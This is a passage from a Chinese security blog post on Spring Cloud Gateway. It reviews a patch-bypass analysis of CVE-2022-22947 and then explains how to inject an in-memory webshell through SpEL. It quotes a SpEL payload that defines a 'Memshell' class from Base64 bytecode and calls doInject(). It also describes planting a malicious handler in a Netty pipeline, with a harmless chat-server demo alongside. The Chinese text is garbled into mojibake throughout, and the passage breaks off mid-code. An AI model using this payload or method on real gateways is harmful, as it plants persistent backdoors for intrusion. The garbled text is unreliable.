<p><code>SimpleEvaluationContext</code> æ˜¯ä¸€ä¸ª<strong>å®‰å…¨ç‰ˆçš„ SpEL EvaluationContext</strong>ï¼ŒJavadoc è¯´ <code>SimpleEvaluationContext</code> ç¦æ­¢ï¼š</p>
<ul>
<li>Java ç±»å‹å¼•ç”¨ <code>T(java.lang.Runtime)</code></li>
<li>æ„é€ å™¨ <code>new Something()</code></li>
<li>bean å¼•ç”¨ <code>@myBean</code></li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>æŒ‰è®¾è®¡ï¼Œå®ƒåº”è¯¥èƒ½å½»åº•é˜»æ­¢ RCEã€‚</strong></p>
<p>ç›¸æ¯”ä¹‹ä¸‹ï¼š</p>
<p>StandardEvaluationContext æ˜¯â€œè¶…çº§å±é™©ç‰ˆâ€ï¼Œå¯ä»¥ç›´æ¥ RCEï¼Œæ‰€ä»¥ VMware ç”¨ <code>SimpleEvaluationContext </code>æ¥ä¿®æ¼æ´ã€‚</p>
<blockquote>
<p>While I was playing around with the patch, I observed that beans without method arguments could still be invoked. For example this means that <code>#{@gatewayProperties.toString}</code> can be used to print out the gatewayProperties bean definition. The SimpleEvaluationContext will not allow <code>#{@gatewayProperties.setRoutes(...)} </code>to be called. This should in essence restrict only getter methods from being invoked.</p>
</blockquote>
<p>è€Œä½œè€…åœ¨æµ‹è¯•è¡¥ä¸åå‘ç°ï¼š SimpleEvaluationContext æŒ‰å®˜æ–¹æ–‡æ¡£è¯´åº”è¯¥ç¦æ­¢ Bean è°ƒç”¨<br><strong>ä½†å®é™…ä¸Šæ²¡æœ‰å®Œå…¨ç¦æ­¢</strong>ã€‚å®ƒé™åˆ¶çš„æ˜¯ï¼šå¸¦å‚æ•°çš„æ–¹æ³•è¢«ç¦æ­¢ï¼›æ— å‚æ–¹æ³•ï¼ˆgetterï¼‰å¯ä»¥è°ƒç”¨</p>
<p>è¿™å˜æˆäº†ä¸€ä¸ªæ½œåœ¨é£é™©ã€‚</p>
<p>ä¾‹å¦‚ï¼š<code>#{@gatewayProperties.toString}</code>è¡¨è¾¾å¼ä»èƒ½è°ƒç”¨è¯¥ bean çš„<code>toString()</code>ï¼Œè™½ç„¶ä¸ä¼š RCE ï¼Œä½†ä¼šæš´éœ²ä¸€äº›ä¿¡æ¯ã€‚</p>
<blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272100828.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>The above screenshot can be seen after sending <code>#{@gatewayProperties.toString}</code> in the two HTTP requests required to add and refresh routes. Notice that some internals can be leaked. Depending on the beans available, this could be used to leak properties or other attributes of the application state.</p>
</blockquote>
<p>VMware çš„ SimpleEvaluationContext ä¿®è¡¥åªèƒ½é˜»æ­¢ RCEï¼Œä½†ä¸èƒ½é˜»æ­¢ Bean getter è¢«è®¿é—®ï¼Œå› æ­¤ä»ç„¶ä¼šäº§ç”Ÿå†…éƒ¨ä¿¡æ¯æ³„éœ²ã€‚<strong>æ¢å¥è¯è¯´ï¼Œæ¼æ´ä» RCE é™çº§ä¸º ä¿¡æ¯æ³„éœ²ï¼Œä½†é—®é¢˜å¹¶æ²¡æœ‰å®Œå…¨æ¶ˆå¤±ã€‚</strong></p>
<blockquote>
<p>The gateway service canâ€™t be responsible for beans that are included in the classpath, but it should at minimum ensure that no beans in itâ€™s library can be invoked to leak significant information or negatively impact the application.</p>
<p>I ended up writing some more CodeQL to see how this would play out. Essentially I wanted to find all Beans that had methods without arguments in the library. From there, it would be helpful to recursively look at the return type and see if there are any methods without arguments that could be called. This would look like bean1.method1.method2.<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054315.png" srcset="/img/loading.gif" lazyload alt="img"></p>
</blockquote>
<p>ä½œè€…æƒ³çŸ¥é“ï¼šSpring Cloud Gateway é‡Œåˆ°åº•æœ‰å“ªäº› Bean å¸¦æœ‰â€œæ— å‚æ–¹æ³•é“¾â€ï¼Ÿ<br>æ¯”å¦‚ï¼š<code>bean1.method1().method2().method3()</code>ï¼Œå¦‚æœ method3 èƒ½åšâ€œå±é™©æ“ä½œâ€ï¼Œæ”»å‡»è€…å°±èƒ½åˆ©ç”¨ã€‚</p>
<p>æœ€åä»–åˆ©ç”¨ CodeQL è‡ªåŠ¨åˆ†æ Spring Cloud Gateway çš„ä»£ç ï¼Œæ‰¾å‡ºæ‰€æœ‰ SpEL å¯èƒ½è°ƒç”¨çš„æ— å‚æ–¹æ³•é“¾ï¼Œä»è€Œåˆ¤æ–­å“ªäº› Bean ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„æ¼æˆ– DoSã€‚  </p>
<p>å³ä½¿å®˜æ–¹ç”¨ SimpleEvaluationContext é™åˆ¶äº† SpELï¼Œå¯åªè¦æ–¹æ³•æ˜¯â€œæ— å‚æ•°â€ï¼ŒSpEL ä»ç„¶å¯èƒ½è°ƒç”¨å±é™©æ–¹æ³•ï¼ˆæ¯”å¦‚ destroy()ï¼‰ï¼Œå¯¼è‡´ DoS  </p>
<p>SimpleEvaluationContext æ— æ³•é¿å…å±é™©æ— å‚æ–¹æ³•è¢«è°ƒç”¨ï¼Œå› æ­¤ VMware å¼•å…¥äº†æ›´ä¸¥æ ¼çš„ PropertyAccessorï¼Œå°†æ‰€æœ‰æ–¹æ³•è°ƒç”¨æ˜ å°„ä¸º nullã€‚é»˜è®¤å¼€å¯ã€‚è‹¥å…³é—­ï¼Œåˆ™ä»ä¼šå—åˆ° DoS ç­‰é£é™©å½±å“ã€‚  </p>
<p>è¯»å®Œ Wyatt å¸ˆå‚…çš„æ–‡ç« ï¼Œæ„Ÿè§‰ä½œè€…çœŸæ­£å¼ºçš„åœ°æ–¹åœ¨äºâ€œä¸æ»¡è¶³äºè¡¥ä¸â€ï¼Œåˆ«äººçœ‹è¡¥ä¸åªä¼šè¯´ï¼šâ€œOK ç”¨ SimpleEvaluationContext å°±å®‰å…¨äº†ã€‚â€ä½œè€…å´ç»§ç»­è¿½é—®ï¼šâ€œå®ƒçœŸçš„å®‰å…¨å—ï¼Ÿâ€ç„¶åï¼šå‘ç° destroy()ï¼Œ è¯æ˜è¡¥ä¸æ²¡é˜²ä½ï¼Œå†åˆ†æå®˜æ–¹ç¬¬äºŒæ¬¡è¡¥ä¸ï¼Œå†ç”¨ CodeQL æ‰«èŒƒå›´æ›´å¹¿çš„ Beanã€‚</p>
<p><strong>æ°¸è¿œä¸ç›¸ä¿¡è¡¥ä¸ï¼Œè‡ªå·±éªŒè¯ã€‚ è¿™æ˜¯ä¸€æ¬¡éå¸¸ä¼˜ç§€çš„å®‰å…¨ç ”ç©¶ï¼Œæ˜¯ Spring Cloud Gateway å®‰å…¨æ–¹å‘æœ€å€¼å¾—å­¦ä¹ çš„èµ„æ–™ä¹‹ä¸€ã€‚</strong>  </p>
<h1 id="ä¸‰ã€Spring-cloud-gateway-é€šè¿‡-SpEL-æ³¨å…¥å†…å­˜é©¬"><a href="#ä¸‰ã€Spring-cloud-gateway-é€šè¿‡-SpEL-æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="ä¸‰ã€Spring cloud gateway é€šè¿‡ SpEL æ³¨å…¥å†…å­˜é©¬"></a>ä¸‰ã€Spring cloud gateway é€šè¿‡ SpEL æ³¨å…¥å†…å­˜é©¬</h1><blockquote>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg">https://mp.weixin.qq.com/s/S15erJhHQ4WCVfF0XxDYMg</a><br>æœ€è¿›å°ç«çš„æ¼æ´ CVE-2022-22947 è™½ç„¶åŸç†ç®€å•ï¼Œä½†æ˜¯å®æˆ˜åˆ©ç”¨è¿˜æ˜¯æœ‰ç‚¹å°éº»çƒ¦ã€‚ç›®å‰å…¬å¼€çš„åˆ©ç”¨æ˜¯æ¯æ‰§è¡Œä¸€æ¡å‘½ä»¤å°±å¾—æ³¨å†Œä¸€æ¡è·¯ç”±ï¼Œrefreshä¸€ä¸‹ç½‘å…³ï¼Œæœ€ååœ¨è®¿é—®è¿™ä¸ªè·¯ç”±ã€‚å…ˆä¸è¯´æ­¥éª¤è¾ƒå¤šï¼Œå°±æ˜¯é¢‘ç¹åˆ·æ–°ä¼šå½±å“ä¸šåŠ¡ã€‚å®æˆ˜å½“ä¸­æ³¨å…¥ä¸€ä¸ªå†…å­˜é©¬æ‰æ˜¯ç¡¬é“ç†ï¼</p>
</blockquote>
<h2 id="3-1-é«˜å¯ç”¨-Payload"><a href="#3-1-é«˜å¯ç”¨-Payload" class="headerlink" title="3.1 é«˜å¯ç”¨ Payload"></a>3.1 é«˜å¯ç”¨ Payload</h2><p>å€Ÿç”¨ <code>@c0ny1</code>å¸ˆå‚…çš„æ–‡ç« ä¸­çš„ payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;Memshell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAA....&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;<br></code></pre></td></tr></table></figure>

<p>è¯¥ payload çš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<p>\1. è§£å†³BCEL&#x2F;jså¼•æ“å…¼å®¹æ€§é—®é¢˜</p>
<p>\2. è§£å†³base64åœ¨ä¸åŒç‰ˆæœ¬jdkçš„å…¼å®¹é—®é¢˜</p>
<p>\3. å¯å¤šæ¬¡è¿è¡ŒåŒç±»åå­—èŠ‚ç </p>
<p>\4. è§£å†³å¯èƒ½å¯¼è‡´çš„ClassNotFoundé—®é¢˜</p>
<h2 id="3-2-netty-å±‚å†…å­˜é©¬"><a href="#3-2-netty-å±‚å†…å­˜é©¬" class="headerlink" title="3.2 netty å±‚å†…å­˜é©¬"></a>3.2 netty å±‚å†…å­˜é©¬</h2><h3 id="3-2-1-Netty"><a href="#3-2-1-Netty" class="headerlink" title="3.2.1 Netty"></a>3.2.1 Netty</h3><p>Netty æ˜¯ <strong>ä¸€ä¸ªåŸºäº Java çš„é«˜æ€§èƒ½ç½‘ç»œé€šä¿¡æ¡†æ¶</strong>ï¼Œä¸»è¦ç”¨äºå¿«é€Ÿå¼€å‘ <strong>é«˜å¹¶å‘ã€é«˜ååé‡ã€ä½å»¶è¿Ÿ</strong> çš„ç½‘ç»œåº”ç”¨ï¼Œå°¤å…¶æ˜¯ <strong>æœåŠ¡å™¨ç«¯</strong> åº”ç”¨ã€‚ç”¨æ¥å¿«é€Ÿå†™å‡ºåƒ Nginxã€RPC æ¡†æ¶ã€IMã€æ¸¸æˆæœåŠ¡å™¨ è¿™ç§éœ€è¦å¤„ç†å¤§é‡è¿æ¥çš„åº”ç”¨ã€‚  </p>
<p>ä¸€ä¸ªç®€å•çš„ Demoï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.src<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>NettyTestDemo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.netty<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>netty-all<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.100.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>	<br></code></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.netty.server;<br><br><span class="hljs-keyword">import</span> io.netty.bootstrap.ServerBootstrap;<br><span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;<br><span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;<br><span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;<br><span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;<br><span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;<br><span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;<br><span class="hljs-keyword">import</span> io.netty.handler.codec.LineBasedFrameDecoder;<br><span class="hljs-keyword">import</span> io.netty.handler.codec.string.StringDecoder;<br><span class="hljs-keyword">import</span> io.netty.handler.codec.string.StringEncoder;<br><br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">boss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();<br>        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();<br>            b.group(boss, worker)<br>            .channel(NioServerSocketChannel.class)<br>            .childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel ch)</span> &#123;<br>                    ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LineBasedFrameDecoder</span>(<span class="hljs-number">1024</span>)); <span class="hljs-comment">// â˜… æŒ‰è¡Œåˆ‡åˆ†</span><br>                    ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringDecoder</span>(Charset.forName(<span class="hljs-string">&quot;GBK&quot;</span>)));<br>                    ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringEncoder</span>(Charset.forName(<span class="hljs-string">&quot;GBK&quot;</span>)));<br>                    ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChatServerHandler</span>());<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">future</span> <span class="hljs-operator">=</span> b.bind(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">7000</span>).sync();<br>            System.out.println(<span class="hljs-string">&quot;èŠå¤©å®¤æœåŠ¡å™¨å¯åŠ¨æˆåŠŸï¼Œç«¯å£ 7000&quot;</span>);<br>            future.channel().closeFuture().sync();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            boss.shutdownGracefully();<br>            worker.shutdownGracefully();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.netty.server;<br><br><span class="hljs-keyword">import</span> io.netty.channel.Channel;<br><span class="hljs-keyword">import</span> io.netty.channel.ChannelHandlerContext;<br><span class="hljs-keyword">import</span> io.netty.channel.SimpleChannelInboundHandler;<br><span class="hljs-keyword">import</span> io.netty.channel.group.ChannelGroup;<br><span class="hljs-keyword">import</span> io.netty.channel.group.DefaultChannelGroup;<br><span class="hljs-keyword">import</span> io.netty.util.concurrent.GlobalEventExecutor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatServerHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleChannelInboundHandler</span>&lt;String&gt; &#123;<br>    <span class="hljs-comment">// ç®¡ç†æ‰€æœ‰è¿æ¥çš„ channel</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ChannelGroup</span> <span class="hljs-variable">channels</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultChannelGroup</span>(GlobalEventExecutor.INSTANCE);<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlerAdded</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">incoming</span> <span class="hljs-operator">=</span> ctx.channel();<br>        channels.writeAndFlush(<span class="hljs-string">&quot;[æœåŠ¡å™¨] - &quot;</span> + incoming.remoteAddress() + <span class="hljs-string">&quot; åŠ å…¥\n&quot;</span>);<br>        channels.add(incoming);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlerRemoved</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">incoming</span> <span class="hljs-operator">=</span> ctx.channel();<br>        channels.writeAndFlush(<span class="hljs-string">&quot;[æœåŠ¡å™¨] - &quot;</span> + incoming.remoteAddress() + <span class="hljs-string">&quot; ç¦»å¼€\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, String msg)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">incoming</span> <span class="hljs-operator">=</span> ctx.channel();<br>        <span class="hljs-keyword">for</span> (Channel ch : channels) &#123;<br>            <span class="hljs-keyword">if</span> (ch != incoming) &#123;<br>                ch.writeAndFlush(<span class="hljs-string">&quot;[&quot;</span> + incoming.remoteAddress() + <span class="hljs-string">&quot;] è¯´: &quot;</span> + msg + <span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ch.writeAndFlush(<span class="hljs-string">&quot;[ä½ ]ï¼š&quot;</span> + msg + <span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionCaught</span><span class="hljs-params">(ChannelHandlerContext ctx, Throwable cause)</span> &#123;<br>        cause.printStackTrace();<br>        ctx.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>æˆ‘è¿™é‡Œçš„æ˜¯ç›‘å¬äº† 0.0.0.0 éƒ¨ç½²åˆ°äº†åŒä¸€å±€åŸŸç½‘å†…ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ChannelFuture future = b.bind(&quot;0.0.0.0&quot;, 7000).sync();<br></code></pre></td></tr></table></figure>



<p>åªéœ€è¦æ‰§è¡Œ<code>telnet 192.168.31.16 7000</code> å°±å¯ä»¥åŠ å…¥è¿™ä¸ªèŠå¤©å®¤ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272100000.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p> <strong>ï¼ˆè¿™å°±æ˜¯æœ€ç®€ç‰ˆ IMï¼ï¼‰</strong>  </p>
<p>å½“ç„¶å‰ææ˜¯ç”µè„‘å®‰è£… Telnet å®¢æˆ·ç«¯ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272100525.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="3-2-2-Netty-å†…å­˜é©¬çš„å…³é”®ç‚¹"><a href="#3-2-2-Netty-å†…å­˜é©¬çš„å…³é”®ç‚¹" class="headerlink" title="3.2.2 Netty å†…å­˜é©¬çš„å…³é”®ç‚¹"></a>3.2.2 Netty å†…å­˜é©¬çš„å…³é”®ç‚¹</h3><p>Netty çš„ç½‘ç»œå¤„ç†æµç¨‹æ˜¯åŸºäº <strong>ChannelPipeline ï¼ˆè´£ä»»é“¾æ¨¡å¼ï¼‰</strong>ï¼ŒHTTP è¯·æ±‚æ¥äº†ä¹‹åï¼Œä¼šç»è¿‡å¤šä¸ªåŠ å·¥ç¯èŠ‚ï¼ˆhandlerï¼‰ï¼Œåœ¨ Netty é‡Œæ’å…¥å†…å­˜é©¬å°±ç›¸å½“äºåœ¨è´£ä»»é“¾ pipeline ä¸­å·å·æ”¾ä¸€ä¸ªæ¶æ„ handlerï¼Œè®©å®ƒæ‹¦æˆªè¯·æ±‚ã€æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ Netty æ¯æ¬¡å¤„ç†æ–°è¿æ¥æ—¶ï¼Œéƒ½ä¼šé‡æ–°æ„å»ºä¸€ä¸ª pipelineã€‚</p>
<p>ä¼ ç»Ÿ java web ä½“ç³»ï¼šFilterã€Servletã€Listener è¿™äº›ç»„ä»¶éƒ½æ˜¯åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶å°±åˆ›å»ºå¥½çš„ï¼Œæœ‰å›ºå®šçš„ç”Ÿå‘½å‘¨æœŸï¼›</p>
<p>Netty åˆ™å®Œå…¨ä¸åŒï¼Œæ¯ä¸€ä¸ªè¯·æ±‚éƒ½ä¼š new ä¸€æ¡æ–°çš„ pipelineï¼Œå¹¶ä¸å­˜åœ¨å›ºå®šçš„å”¯ä¸€çš„ Filter&#x2F;Servlet è¿™ç§ä¸œè¥¿ã€‚</p>
<p>é‚£ä¹ˆè°è´Ÿè´£ç»™ pipeline æ·»åŠ  handlerï¼Ÿ</p>
<p>-&gt; <strong>ChannelPipelineConfigurer</strong></p>
<p><code>ChannelPipelineConfigurer</code>åœ¨ pipeline åˆ›å»ºæ—¶ï¼Œé…ç½®å®ƒåº”è¯¥åŒ…å«å“ªäº› handlerï¼ŒæŒ‰ä»€ä¹ˆé¡ºåºæ·»åŠ  handlerã€‚</p>
<p><em>æºç ä½ç½®ï¼š</em></p>
<p>i<code>o\projectreactor\netty\reactor-netty-core\1.1.0\reactor-netty-core-1.1.0-sources.jar!\reactor\netty\ReactorNetty.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span 